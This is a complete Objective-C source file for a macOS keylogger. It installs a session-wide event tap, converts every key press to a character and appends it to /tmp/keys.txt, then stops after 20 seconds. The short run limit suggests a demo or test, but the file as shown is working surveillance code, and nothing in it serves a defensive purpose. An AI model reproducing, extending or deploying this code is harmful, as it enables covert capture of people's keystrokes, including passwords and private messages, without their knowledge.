#import <Carbon/Carbon.h>
#import <Cocoa/Cocoa.h>

NSString* logFile = @"/tmp/keys.txt";

NSDictionary* keyMap;

NSString* keyCodeToChar(int keyCode) {
  return keyMap[@(keyCode)] ?: [NSString stringWithFormat:@"[%d]", keyCode];
}

CGEventRef keyloggerCallback(
    CGEventTapProxy proxy,
    CGEventType type,
    CGEventRef event,
    void* refcon) {
  if (type == kCGEventKeyDown) {
    int keyCode =
        (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    NSString* charStr = keyCodeToChar(keyCode);
    NSString* log = [NSString stringWithFormat:@"Key pressed: %@\n", charStr];

    NSData* data = [log dataUsingEncoding:NSUTF8StringEncoding];

    NSFileHandle* fileHandle =
        [NSFileHandle fileHandleForWritingAtPath:logFile];
    if (fileHandle) {
      [fileHandle seekToEndOfFile];
      [fileHandle writeData:data];
      [fileHandle closeFile];
    } else {
      [[NSFileManager defaultManager] createFileAtPath:logFile
                                              contents:data
                                            attributes:nil];
    }
  }
  return event;
}

void stopRunLoop(CFRunLoopTimerRef timer, void* info) {
  CFRunLoopStop(CFRunLoopGetCurrent());
  NSLog(@"Time limit reached. Stopping.");
}

int main(int argc, const char* argv[]) {
  @autoreleasepool {
    keyMap = @{
      @0 : @"A",
      @1 : @"S",
      @2 : @"D",
      @3 : @"F",
      @4 : @"H",
      @5 : @"G",
      @6 : @"Z",
      @7 : @"X",
      @8 : @"C",
      @9 : @"V",
      @10 : @"",
      @11 : @"B",
      @12 : @"Q",
      @13 : @"W",
      @14 : @"E",
      @15 : @"R",
      @16 : @"Y",
      @17 : @"T",
      @18 : @"1",
      @19 : @"2",
      @20 : @"3",
      @21 : @"4",
      @22 : @"6",
      @23 : @"5",
      @24 : @"=",
      @25 : @"9",
      @26 : @"7",
      @27 : @"-",
      @28 : @"8",
      @29 : @"0",
      @30 : @"]",
      @31 : @"O",
      @32 : @"U",
      @33 : @"[",
      @34 : @"I",
      @35 : @"P",
      @36 : @"",
      @37 : @"L",
      @38 : @"J",
      @39 : @"'",
      @40 : @"K",
      @41 : @";",
      @42 : @"\\",
      @43 : @",",
      @44 : @"/",
      @45 : @"N",
      @46 : @"M",
      @47 : @".",
      @48 : @"`",
      @49 : @"Tab",
      @50 : @"Space",
      @51 : @"Shift",
      @52 : @"Caps Lock",
      @53 : @"Alt",
      @54 : @"",
      @55 : @"",
      @56 : @"",
      @57 : @"",
      @58 : @"",
      @59 : @"",
      @60 : @"",
      @61 : @"",
      @62 : @"",
      @63 : @"Application",
      @64 : @"Help",
      @65 : @".",
      @66 : @"Enter",
      @67 : @"*",
      @68 : @"Escape",
      @69 : @"+",
      @70 : @"F1",
      @71 : @"F2",
      @72 : @"F3",
      @73 : @"F4",
      @74 : @"F5",
      @75 : @"F6",
      @76 : @"F7",
      @77 : @"F8",
      @78 : @"F9",
      @79 : @"F10",
      @80 : @"F11",
      @81 : @"F12",
      @82 : @"0",
      @83 : @"1",
      @84 : @"2",
      @85 : @"3",
      @86 : @"4",
      @87 : @"5",
      @88 : @"6",
      @89 : @"7",
      @90 : @"8",
      @91 : @"9"
    };
    CGEventMask eventMask = (1 << kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        eventMask,
        keyloggerCallback,
        NULL);
    if (!eventTap) {
      NSLog(
          @"Failed to create event tap. Make sure the app has Accessibility permissions.");
      return 1;
    }
    CFRunLoopSourceRef runLoopSource =
        CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(
        CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        NULL, CFAbsoluteTimeGetCurrent() + 20, 0, 0, 0, stopRunLoop, NULL);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopCommonModes);
    CFRunLoopRun();
  }
  return 0;
}
